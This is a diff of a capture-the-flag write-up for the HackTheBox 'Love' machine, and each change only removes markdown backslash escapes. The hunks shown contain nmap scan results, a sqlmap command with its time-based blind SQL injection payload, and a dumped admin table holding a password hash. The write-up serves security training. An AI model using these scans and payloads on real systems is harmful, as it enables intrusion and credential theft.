@@ -77,7 +77,7 @@ To determine the presence of a possible attack vector, it is essential to begin 
 
 ### Port Enumeration
 
-Along with enumerating open ports, their services and their versions are also examined using the \-sC (for default scripts) and \-sV (enumerate version) flags.
+Along with enumerating open ports, their services and their versions are also examined using the -sC (for default scripts) and -sV (enumerate version) flags.
 
 {% highlight bash %}
 Nmap scan report for 10.10.10.239
@@ -90,7 +90,7 @@ PORT     STATE SERVICE      VERSION
 
 80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
 
-| http\-cookie\-flags:
+| http-cookie-flags:
 
 |   /:
 
@@ -98,25 +98,25 @@ PORT     STATE SERVICE      VERSION
 
 |_      httponly flag not set
 
-| http\-methods:
+| http-methods:
 
 |_  Supported Methods: GET HEAD POST OPTIONS
 
-|_http\-server\-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 
-|_http\-title: Voting System using PHP
+|_http-title: Voting System using PHP
 
 135/tcp  open  msrpc        Microsoft Windows RPC
 
-139/tcp  open  netbios\-ssn  Microsoft Windows netbios\-ssn
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
 
 443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
 
-|_http\-server\-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 
-|_http\-title: 403 Forbidden
+|_http-title: 403 Forbidden
 
-| ssl\-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
 
 | Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
 
@@ -126,41 +126,41 @@ PORT     STATE SERVICE      VERSION
 
 | Signature Algorithm: sha256WithRSAEncryption
 
-| Not valid before: 2021\-01\-18T14:00:16
+| Not valid before: 2021-01-18T14:00:16
 
-| Not valid after:  2022\-01\-18T14:00:16
+| Not valid after:  2022-01-18T14:00:16
 
 | MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
 
-|_SHA\-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
+|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
 
-|_ssl\-date: TLS randomness does not represent time
+|_ssl-date: TLS randomness does not represent time
 
-| tls\-alpn:
+| tls-alpn:
 
 |_  http/1.1
 
-445/tcp  open  microsoft\-ds Windows 10 Pro 19042 microsoft\-ds (workgroup: WORKGROUP)
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
 
 3306/tcp open  mysql?
 
-| fingerprint\-strings:
+| fingerprint-strings:
 
-|   DNSVersionBindReqTCP, Help, JavaRMI, LDAPBindReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TerminalServer, afp, ms\-sql\-s:
+|   DNSVersionBindReqTCP, Help, JavaRMI, LDAPBindReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TerminalServer, afp, ms-sql-s:
 
 |_    Host '10.10.14.138' is not allowed to connect to this MariaDB server
 
 5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
 
-|_http\-server\-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 
-|_http\-title: 403 Forbidden
+|_http-title: 403 Forbidden
 
 Host script results:
 
-|_clock\-skew: mean: 2h52m30s, deviation: 4h02m31s, median: 32m28s
+|_clock-skew: mean: 2h52m30s, deviation: 4h02m31s, median: 32m28s
 
-| smb\-os\-discovery:
+| smb-os-discovery:
 
 |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
 
@@ -172,9 +172,9 @@ Host script results:
 
 |   Workgroup: WORKGROUP\\x00
 
-|_  System time: 2021\-05\-07T14:50:29\-07:00
+|_  System time: 2021-05-07T14:50:29-07:00
 
-| smb\-security\-mode:
+| smb-security-mode:
 
 |   account_used: guest
 
@@ -184,15 +184,15 @@ Host script results:
 
 |_  message_signing: disabled (dangerous, but default)
 
-| smb2\-security\-mode:
+| smb2-security-mode:
 
 |   2.02:
 
 |_    Message signing enabled but not required
 
-| smb2\-time:
+| smb2-time:
 
-|   date: 2021\-05\-07T21:50:28
+|   date: 2021-05-07T21:50:28
 
 |_  start_date: N/A
 {% endhighlight %}
@@ -224,7 +224,7 @@ Upon inputting a SQL query into the username field, an “Incorrect password” 
 {% highlight bash %}
 ┌─[0xd4y@Writeup]─[~/business/hackthebox/easy/windows/love]                                                                                                                 
 
-└──╼ $sqlmap \-r login.burp \--batch \--dump                                                                                                                                  
+└──╼ $sqlmap -r login.burp --batch --dump                                                                                                                                  
 
        ___                                                                                                                                                                
 
@@ -238,13 +238,13 @@ _ __["]__ __ __  {1.4.10#stable}                               �
 
 and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                    
 
-[\*] starting @ 17:47:39 /2021\-05\-26/                                                                                                                                       
+[\*] starting @ 17:47:39 /2021-05-26/                                                                                                                                       
 
 [17:47:39] [INFO] parsing HTTP request from 'login.burp'                                                                                                                   
 
 [17:47:40] [WARNING] provided value for parameter 'login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
 
-[17:47:40] [INFO] resuming back\-end DBMS 'mysql'
+[17:47:40] [INFO] resuming back-end DBMS 'mysql'
 
 [17:47:40] [INFO] testing connection to the target URL                                                                                                                      
 
@@ -254,17 +254,17 @@ redirect is a result of a POST request. Do you want to resend original POST da
 
 sqlmap resumed the following injection point(s) from stored session:                 
 
-\---                                                                                                                                                                         
+---                                                                                                                                                                         
 
 Parameter: voter (POST)                                                                                                                                                     
 
-   Type: time\-based blind                                                          
+   Type: time-based blind                                                          
 
-   Title: MySQL \>= 5.0.12 AND time\-based blind (query SLEEP)
+   Title: MySQL \>= 5.0.12 AND time-based blind (query SLEEP)
 
    Payload: voter=a' AND (SELECT 5793 FROM (SELECT(SLEEP(5)))bSGe) AND 'YMSl'='YMSl&password=a&login=
 
-\---   
+---   
 
 Database: votesystem                                                                                                                                                        
 
@@ -278,7 +278,7 @@ Table: admin                                             
 
 +----+--------+----------+--------------------------------------------------------------+----------+-----------+------------+                                               
 
-| 1  | nc.exe | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018\-04\-02 |                                               
+| 1  | nc.exe | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018-04-02 |                                               
 
 +----+--------+----------+--------------------------------------------------------------+----------+-----------+------------+
 {% endhighlight %}
@@ -326,7 +326,7 @@ Along with enumerating the SQL server, the directories of the web service were a
 
 /prn (Status: 403)
 
-/server\-status (Status: 403)
+/server-status (Status: 403)
 
 /tcpdf (Status: 301)
 
